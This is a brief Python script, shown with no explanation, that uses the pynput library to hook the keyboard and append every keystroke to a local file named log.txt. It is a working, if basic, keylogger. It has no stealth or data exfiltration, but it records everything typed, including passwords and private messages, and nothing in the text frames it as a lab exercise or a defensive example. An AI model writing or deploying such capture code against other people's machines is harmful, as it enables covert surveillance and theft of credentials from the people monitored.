from pynput.keyboard import Listener

def writetofile(key):
    keyboardData = str(key)
    # creating the file for the keystroke 
    with open("log.txt","a") as file:
        file.write(keyboardData)

with Listener(on_press = writetofile) as listener:
    listener.join()

